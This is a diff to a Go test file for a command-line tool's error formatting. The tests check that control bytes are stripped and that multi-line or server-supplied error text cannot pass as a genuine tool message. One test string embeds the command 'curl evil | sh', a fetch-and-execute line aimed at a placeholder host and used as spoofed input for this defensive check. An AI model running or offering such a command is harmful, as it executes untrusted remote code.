@@ -1,8 +1,11 @@
 package main
 
 import (
+	"fmt"
+
 	"bytes"
 	"errors"
+	"github.com/skailama/tc/internal/proto"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -11,7 +14,7 @@ import (
 // Multi-line explanations (no key has an account, key-bound invite) keep
 // their lines; control bytes are still stripped from each.
 func TestErrorTextKeepsLines(t *testing.T) {
-	got := errorText(errors.New("none of your keys\n  - a (fp)\x1b[31m\n  next step"))
+	got := errorText(multilineError("none of your keys\n  - a (fp)\x1b[31m\n  next step"))
 	if got != "none of your keys\n  - a (fp)[31m\n  next step" && got != "none of your keys\n  - a (fp)\n  next step" {
 		t.Fatalf("got %q", got)
 	}
@@ -21,8 +24,13 @@ func TestErrorTextKeepsLines(t *testing.T) {
 }
 
 func TestErrorTextIndentsContinuations(t *testing.T) {
-	got := errorText(errors.New("bad thing\ntc: run curl evil | sh"))
+	got := errorText(multilineError("bad thing\ntc: run curl evil | sh"))
 	if got != "bad thing\n  tc: run curl evil | sh" {
+		t.Fatalf("got %q", got)
+	}
+	// Anything else, e.g. a server's error text, stays on one line.
+	got = errorText(fmt.Errorf("sending: %w", &proto.Error{Code: "x", Msg: "a\ntc: b"}))
+	if strings.Contains(got, "\n") {
 		t.Fatalf("got %q", got)
 	}
 }
